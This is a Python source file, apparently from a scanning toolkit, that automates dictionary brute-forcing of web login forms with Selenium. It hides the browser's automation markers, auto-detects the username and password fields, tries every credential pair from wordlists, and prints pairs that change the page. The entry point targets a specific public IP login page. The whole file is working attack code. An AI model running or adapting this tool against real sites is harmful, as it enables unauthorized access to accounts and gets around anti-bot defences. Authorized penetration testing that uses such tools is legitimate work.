import time
import re
import difflib

from selenium import webdriver
# from selenium.webdriver.common.keys import Keys
import requests
from selenium.webdriver.common.by import By
from config.config import captcha_keyword_list
from config.path import svscan_path_set, rule_path
import asyncio
from concurrent.futures import ThreadPoolExecutor

success1 = 0
u_flag_str = list()
u_flag_xpath = list()
p_flag_str = list()
p_flag_xpath = list()
username_list = list()
password_list = list()


# from selenium.webdriver.common.keys import Keys

# username_list = ['userName', 'login_username', 'WG_username_input', 'username', 'UserAccount']

def string_similar(s1, s2):
    return difflib.SequenceMatcher(None, s1, s2).quick_ratio()


# 初始化浏览器，加入防爬绕过
def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    # options.add_argument('--headless')
    options.add_argument('ignore-certificate-errors')
    # options.add_argument("--no-sandbox") # linux only
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    driver = webdriver.Chrome(options=options)
    driver.execute_cdp_cmd("Network.enable", {})
    driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": {"User-Agent": "browserClientA"}})
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": """
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            })
        """
    })
    return driver


def check_captcha(url):
    try:
        req = requests.get(url, verify=False)
        for c in captcha_keyword_list:
            if c in req.text:
                print(f'[!]{url} 页面存在验证码，结束爆破.')
                return True
    except:
        pass


def check_flag(_browser):
    u_flag = None
    p_flag = None
    if u_flag is None:
        for uf in u_flag_str:
            try:
                _browser.find_element(By.NAME, uf)
                u_flag = (uf, 'str')
                print(f'[+] 用户名登陆字段为：{u_flag}')
            except:
                pass
    if u_flag is None:
        for uf in u_flag_xpath:
            try:
                _browser.find_element(By.XPATH, uf)
                u_flag = (uf, 'xpath')
                print(f'[+] 用户名登陆字段为：{u_flag}')
            except:
                pass
    if p_flag is None:
        for pf in p_flag_str:
            try:
                _browser.find_element(By.NAME, pf)
                p_flag = (pf, 'str')
                print(f'[+] 密码登陆字段为：{p_flag}')
            except:
                pass
    if p_flag is None:
        for pf in p_flag_xpath:
            try:
                _browser.find_element(By.XPATH, pf)
                p_flag = (pf, 'xpath')
                print(f'[+] 密码登陆字段为：{p_flag}')
            except:
                pass
    if u_flag and p_flag:
        _browser.quit()
        return u_flag, p_flag
    else:
        _browser.quit()
        return None, None


def crack(user_flag, pass_flag, username, password, url):
    if success1 == 0:
        print(f'[*]正在尝试 {username},{password} url:{url}')
        _browser = get_driver()
        _browser.get(url)
        clicks_num = None
        before_page = _browser.page_source
        # before_page = _browser.title
        try:
            if user_flag[1] == 'str':
                _browser.find_element(By.NAME, user_flag[0]).send_keys(username)
            if user_flag[1] == 'xpath':
                _browser.find_element(By.XPATH, user_flag[0]).send_keys(username)
            if pass_flag[1] == 'str':
                _browser.find_element(By.NAME, pass_flag[0]).send_keys(password)
            if pass_flag[1] == 'xpath':
                _browser.find_element(By.XPATH, pass_flag[0]).send_keys(password)
            # if 'type="submit"' in before_page:
            #     _browser.find_element(By.CSS_SELECTOR, '[type=submit]').click()
            # elif 'type="button"' in before_page:
            #     _browser.find_element(By.CSS_SELECTOR, '[type=button]').click()
            # else:
            #     _browser.find_element(By.CSS_SELECTOR, 'button').click()
            if re.findall('<input class="(.*?)" type="button"', before_page):
                clicks = _browser.find_elements(By.CSS_SELECTOR, 'input')
                for click in clicks:
                    if click.tag_name == 'input':
                        clicks_num = 'input'
                        break
            if re.findall('<button(.*?)"', before_page):
                clicks = _browser.find_elements(By.CSS_SELECTOR, 'button')
                for click in clicks:
                    if click.tag_name == 'button':
                        clicks_num = 'button'
                        break
            if len(clicks_num) <= 1:
                if 'type="submit"' in before_page:
                    _browser.find_element(By.CSS_SELECTOR, '[type=submit]').click()
                elif 'type="button"' in before_page:
                    _browser.find_element(By.CSS_SELECTOR, '[type=button]').click()
                else:
                    _browser.find_element(By.CSS_SELECTOR, 'button').click()
                time.sleep(3)
                later_page = _browser.page_source
                print(string_similar(later_page, before_page))
                if string_similar(later_page, before_page) < 0.8:
                    print(f'[+] 登陆密码: {username},{password},url:{url}')
                    _browser.quit()
                _browser.quit()
            else:
                # for click in clicks_num:
                clicks = _browser.find_elements(By.CSS_SELECTOR, clicks_num)
                for c in clicks:
                    if any(l in c.accessible_name for l in ['登', 'Login', 'login', 'LOGIN', 'sign up', 'Sign Up']):
                        c.click()
                        break
                time.sleep(3)
                later_page = _browser.page_source
                print(string_similar(later_page, before_page))
                if string_similar(later_page, before_page) < 0.8:
                    print(f'[+] 登陆密码: {username},{password},url:{url}')
                    _browser.quit()
                _browser.quit()
        except Exception as e:
            _browser.quit()
        # time.sleep(3)
        # later_page = _browser.page_source
        # if string_similar(later_page, before_page) < 0.8:
        #     print(f'[+] 登陆密码: {username},{password},url:{url}')
        #     _browser.quit()
        # _browser.quit()


def run(url):
    # 读取字典
    usernamedict = svscan_path_set.get('dict').get('http_username').open('r', encoding='UTF-8')
    username_list.extend(usernamedict.read().split())
    passworddict = svscan_path_set.get('dict').get('http_password').open('r', encoding='UTF-8')
    password_list.extend(passworddict.read().split())

    u_flagstr = rule_path.get('ustrflag_path').open('r', encoding='UTF-8')
    u_flag_str.extend(u_flagstr.read().split())
    u_flagxpath = rule_path.get('uxpathflag_path').open('r', encoding='UTF-8')
    u_flag_xpath.extend(u_flagxpath.read().split())

    p_flagstr = rule_path.get('pstrflag_path').open('r', encoding='UTF-8')
    p_flag_str.extend(p_flagstr.read().split())
    p_flagxpath = rule_path.get('pxpathflag_path').open('r', encoding='UTF-8')
    p_flag_xpath.extend(p_flagxpath.read().split())
    tasks = list()
    # if check_captcha(url):
    #     return
    browser = get_driver()
    browser.maximize_window()
    browser.get(url)
    # browser.implicitly_wait()
    user_flag, pass_flag = check_flag(browser)
    if user_flag is None or pass_flag is None:
        print('[!] 无法识别表单请手动添加')
        browser.quit()
        return
    new_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(new_loop)
    loop = asyncio.get_event_loop()
    executor = ThreadPoolExecutor(1)
    for username in username_list:
        for password in password_list:
            tasks.append(loop.run_in_executor(executor, crack, user_flag, pass_flag, username, password, url))
    loop.run_until_complete(asyncio.wait(tasks))
    loop.close()
    browser.quit()

if __name__=='__main__':
    run('https://60.173.17.250:7002/login#/')
